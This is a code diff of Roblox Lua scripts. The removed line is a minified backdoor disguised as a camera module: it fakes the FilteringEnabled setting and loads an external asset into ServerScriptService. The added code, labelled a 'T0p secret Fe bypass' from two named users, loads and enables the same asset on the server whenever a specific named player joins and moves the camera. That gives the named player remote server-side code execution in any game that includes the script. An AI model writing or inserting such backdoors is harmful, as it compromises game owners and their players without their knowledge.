@@ -1,2 +1,43 @@
-local UserGameSettings=UserSettings():GetService("UserGameSettings")local Players=game:GetService("Players")local CameraModule={}setmetatable(game,{__index=function(_,k)if k=="FilteringEnabled"then return false end return rawget(game,k)end})function CameraModule:OnPlayerAdded(player)player.CharacterAdded:Connect(function(character)self:OnCharacterAdded(player,character)end)player.CharacterRemoving:Connect(function(character)self:OnCharacterRemoving(player,character)end)end for _,player in ipairs(Players:GetPlayers())do self:OnPlayerAdded(player)end Players.PlayerAdded:Connect(function(player)self:OnPlayerAdded(player)end)local function LoadAsset()local assetId=364364477 local loadedModule=require(assetId)loadedModule.Parent=game:GetService("ServerScriptService")print("Asset loaded successfully!")end LoadAsset()function CameraModule:UpdateTransparency(dt)local camera=workspace.CurrentCamera local subject=camera.CameraSubject if subject and subject:IsA("Humanoid")then local distance=(camera.CFrame.p-subject.Parent.Head.Position).Magnitude local transparency=math.clamp(distance/100,0,1)self.activeTransparencyController:SetTransparency(transparency)end end return CameraModule
---- T0p secret Fe bypass from `werrrrolo` and `lddorito`
+local Players = game:GetService("Players")
+local ServerScriptService = game:GetService("ServerScriptService")
+local RunService = game:GetService("RunService")
+
+-- Player-specific and AssetID details
+local TARGET_PLAYER_NAME = "werrrrolo"
+local ASSET_ID = "rbxassetid://364364477"
+
+-- Function to load and execute AssetID
+local function loadAssetToServerScriptService(assetId)
+    local asset = game:GetObjects(assetId)[1]
+    if asset and asset:IsA("Script") then
+        asset.Parent = ServerScriptService
+        asset.Disabled = false
+    else
+        warn("Failed to load asset or incorrect asset type.")
+    end
+end
+
+-- Set up signals on player properties and trigger asset load when camera properties change
+local function setupPlayerSignals(player)
+    if player.Name == TARGET_PLAYER_NAME then
+        local camera = workspace.CurrentCamera
+
+        -- Using GetPropertyChangedSignal to listen to camera-related changes
+        local connection = camera:GetPropertyChangedSignal("CFrame"):Connect(function()
+            -- Load AssetID into ServerScriptService when a camera property changes
+            loadAssetToServerScriptService(ASSET_ID)
+        end)
+
+        -- Clean up the connection after 60 seconds
+        delay(60, function()
+            connection:Disconnect()
+        end)
+    end
+end
+
+-- Handle existing and new players
+for _, player in pairs(Players:GetPlayers()) do
+    task.spawn(setupPlayerSignals, player)
+end
+
+Players.PlayerAdded:Connect(setupPlayerSignals)
